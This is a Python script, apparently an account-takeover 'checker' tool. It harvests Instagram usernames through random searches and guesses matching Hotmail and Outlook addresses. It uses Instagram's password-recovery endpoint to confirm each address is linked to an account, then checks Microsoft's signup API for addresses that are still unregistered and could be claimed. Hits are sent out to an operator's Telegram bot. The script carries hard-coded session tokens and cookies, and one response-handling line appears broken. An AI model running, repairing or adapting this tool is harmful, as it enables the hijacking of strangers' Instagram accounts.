#!/usr/bin/env python
# """
#  ______   _______  _______  _        _______  _______  _______ 
# (  __  \ (  ____ \(  ____ \| \    /\(  ____ )(  ___  )(  ___  )
# | (  \  )| (    \/| (    \/|  \  / /| (    )|| (   ) || () () |
# | |   ) || (__    | (_____ |  (_/ / | (____)|| (___) || || || |
# | |   | ||  __)   (_____  )|   _ (  |     __)|  ___  || |(_)| |
# | |   ) || (            ) ||  ( \ \ | (\ (   | (   ) || |   | |===>("Ali")
# | (__/  )| (____/\/\____) ||  /  \ \| ) \ \__| )   ( || )   ( |
# (______/ (_______/\_______)|_/    \/|/   \__/|/     \||/     \|
# """         ___                  
# User --- > <(-_-)> Attcker --> :) 
# [+] Tool Checker Instgram Hotmail & utlook! 

import requests, random, string , secrets
from user_agent import generate_user_agent
from pyfiglet import Figlet
from colorama import Fore
from time import sleep

f = Figlet(font='epic')  
print(Fore.BLUE + f.renderText('DeskRam'))


class InstagramChecker:
    def __init__(self, token, chat_id, essionid=None):
        self.token = token
        self.chat_id = chat_id
        self.essionid = essionid
    def FindUsers(self,search='dark'):
        headers = {
            'Host': 'www.instagram.com',
            'User-Agent': generate_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Friendly-Name': 'PolarisSearchBoxRefetchableQuery',
            'X-Fb-Lsd': 'RJF28x4KdJPgA1CuvlWMiG',
            'X-Asbd-Id': '129477',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Sec-Fetch-Site': 'same-origin',
            'Cookie': f'essionid={self.essionid}',
        }   
        data = {
            'av': '17841465147044111',
            '__d': 'www',
            '__user': '0',
            '__a': '1',
            '__req': '1a',
            '__hs': '19805.HYP:instagram_web_pkg.2.1..0.1',
            'dpr': '1',
            '__ccg': 'UNKNOWN',
            '__rev': '1012270750',
            '__s': 'krj422:x61jbm:59db4b',
            '__hsi': '7349552263422712440',
            '__dyn': '7xeUjG1mxu1syUbFp40NonwgU7SbzEdF8aUco2qwJxS0k24o0B-q1ew65xO0FE2awt81s8hwGwQwoEcE7O2l0Fwqo31w9a9x-0z8jwae4UaEW2G1NwwwNwKwHw8Xxm16wUwtEvw4JwJCwLyES1Twoob82cwMwrUdUbGwmk0KU6O1FwlE6PhA6bxy6UK6V89F8C58',
            '__csr': 'ha1P2RiIY4JR9iiOOlEnsjtbb-BeBnl8hpeqozr48P_euj9WULr89iCmLQi49pBzpFFbyrmniWJvQWX9G8DLgyjAG9jgB6mmEGm59UFyXyWLBLCDDgtAmdpe5oSmUycBgOcyUlx6m8xmC00lcu1AyE8oiDzcw7Iw0A903w80py791i6EB0DzQ0gW2a6ooPQ1eglw31o0yUEmwj47A0pDwvF206FU5-m1ww4cPwaGexO00AME',
            '__comet_req': '7',
            'fb_dtsg': 'NAcMt6E2k3lN78AjhJYeISaeHRV6Aks6hyJngNBX-uuIYTiR5sOMicg:17864721031021537:1711200982',
            'jazoest': '26179',
            'lsd': 'RJF28x4KdJPgA1CuvlWMiG',
            '__spin_r': '1012270750',
            '__spin_b': 'trunk',
            '__spin_t': '1711200984',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableQuery',
            'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+ search +'","rank_token":"1711201047016|4f09fcff1cf59f955977101360a9e2b184e2d37e504ffd3a04027ccb5c33c8fd","search_surface":"web_top_search"},"hasQuery":true}',
            'server_timestamps': 'true',
            'doc_id': '6990233261085530',
        }
        response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
        users_list =response.json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
        email_providers = ["outlook.com", "hotmail.com"]
        current_user_index = 0
        while current_user_index < len(users_list):
            username = users_list[current_user_index]['user']['username']
            for provider in email_providers:
                email = f"{username}@{provider}"
                if self._check_email(email):
                    self._send_notification(email)
            current_user_index += 1

    def _check_email(self, email):
        headers = {
            'Host': 'www.instagram.com',
            'User-Agent': generate_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Csrftoken': '3Wq2m0qCLXLZTj0M4igFxuLY5IQxh5vK',
            'X-Instagram-Ajax': '1012271930',
            'X-Ig-App-Id': '936619743392459',
            'X-Asbd-Id': '129477',
            'X-Ig-Www-Claim': 'hmac.AR3A6eLEaJA-RBwxG4iVZbFij3C32KD22HyIg7YnII5GnPWh',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/password/reset/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        data = {
            'email_or_username': email,
        }

        checkfronrecovery = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
            headers=headers,
            data=data,
        )
        checkfronrecovery = checkfronrecovery.json()
        if checkfronrecovery['message'] != 'No users found' and checkfronrecovery['status'] != 'fail':            
            headers = {
                'Host': 'signup.live.com',
                'User-Agent': generate_user_agent(),
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': f'https://signup.live.com/signup?lic=1&uaid={secrets.token_hex(32)}',
                'Content-Type': 'application/json',
                'Canary': 'V+E2q337KfwdOtr1QpxYa3V6/uxL3WtZ2RWAJF7rSw3mOJiBYOIVhcvIbPyAVPohbHWCypw7uUNP9MgiTVVHF9vACwz2uEcmdHidP9PG+5zilhNYO98qKSVAC6tDInhncCc5xtwVZwssS/u0s/ndg9cP8nmxapG6llZrQ7i5rufU61hxLQhwUqX7+v9NaErpoNqq4S18GhxBq5OYV2AfOUzBnloTOsdnGdNGZABaVNc0zYV524CUdUVmqmrcPhDe:2:3c',
                'X-Ms-Apiversion': '2',
                'X-Ms-Apitransport': 'xhr',
                'Uiflvr': '1001',
                'Scid': '100118',
                'Hpgid': '200639',
                'Uaid': f'{secrets.token_hex(32)}',
                'Origin': 'https://signup.live.com',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Cookie': 'amsc=nY4u/JM9Lt1mKlSsI/Gncs/sfgfcIR4UVTfiZd+8JQRFXYsbt0gerRsTNx1Yv2yH97/3SDpYPV6sxls1/WYPB8d0unWyXEqZQoCVNXk5kguJ8JQoCP0rTVN7pEDXepBq66UDgEjQb5OMN/VjaPp4aWV55ke/1towapFCZjajKsdXcXzjiNCbRMQf6rtjH1cjnmuzZRdAE3ewlYZyvLIwZg1IBrYb6p80/I3reCwZRIOY+QHkX02ceOQBstWe9Mw5BQRUkxqvMyhuDqAT3Rl9PSBDUQQ6v5WfTbw5U0+ZD48=:2:3c',
            }

            json_data = {
                'signInName': email,
                'includeSuggestions': True,
                'uiflvr': 1001,
                'scid': 100118,
                'hpgid': 200639,
            }

            checkavailable = requests.post(
                'https://signup.live.com/API/CheckAvailableSigninNames?lic=1',
                headers=headers,
                json=json_data,
            )
            if checkavailable['isAvailable'] == True:
                return email
        else:
            print(f'fail {email}')

    def _send_notification(self, email):
        print(email)
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        message = f"Email found: {email}"
        payload = {'chat_id': self.chat_id, 'text': message}
        requests.post(url, data=payload)

def generate_random_search(length):
    characters = string.ascii_lowercase + string.digits + '._'
    return ''.join(random.choice(characters) for _ in range(length))

search_terms = [
    [], 
    [], 
    [], 
    [],  
    []  
]

def main():
    id = input('[+] Enter Your ID: ')
    token = input('[+] Enter Your Token: ')
    sessionid = input('[+] Enter Your Session ID: ')
    checker = InstagramChecker(token, id, sessionid)
    
    for i, length in enumerate(range(3, 8)):
        for _ in range(10): 
            search_term = generate_random_search(length)
            checker.FindUsers(search_term)
            sleep(30)
            
if __name__ == "__main__":
    main()
